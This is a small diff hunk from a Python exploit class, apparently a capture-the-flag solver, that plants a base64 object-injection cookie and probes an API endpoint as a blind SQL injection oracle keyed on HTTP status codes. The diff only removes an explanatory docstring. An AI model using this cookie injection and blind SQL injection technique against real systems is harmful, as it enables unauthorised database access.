@@ -112,10 +112,6 @@ class cookie_bsqli:
 		Now set the current session cookie's to our object injected cookie + nginxatsu_session
 		"""
 		self.session.cookies.set(cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
-
-		"""
-		This blind sql injection is http status code conditional/error based so anything other than 200 will be blind mysql error
-		"""
 		r = self.session.get(BASE_URL+'api/configs/')
 		if r.status_code == 200 and ch:
 			if type(ch) == int:
